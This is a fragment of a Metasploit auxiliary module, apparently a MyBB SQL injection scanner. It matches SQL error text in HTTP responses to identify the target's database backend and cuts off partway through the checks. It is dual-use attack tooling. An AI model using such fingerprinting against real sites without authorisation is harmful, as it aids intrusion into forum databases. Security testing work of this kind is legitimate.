...
class MetasploitModule < Msf::Auxiliary
  ...
  def run
    ...
    # Resolve response
    if response.body =~ /SELECT COUNT\(\*\) AS users FROM mybb_users u WHERE 1=1 AND u.username NOT REGEXP\(\'\[a-zA-Z\]\'\)/
      print_good("Running PostgreSQL Database")
    elsif response.body =~ /General error\: 1 no such function\: REGEXP/
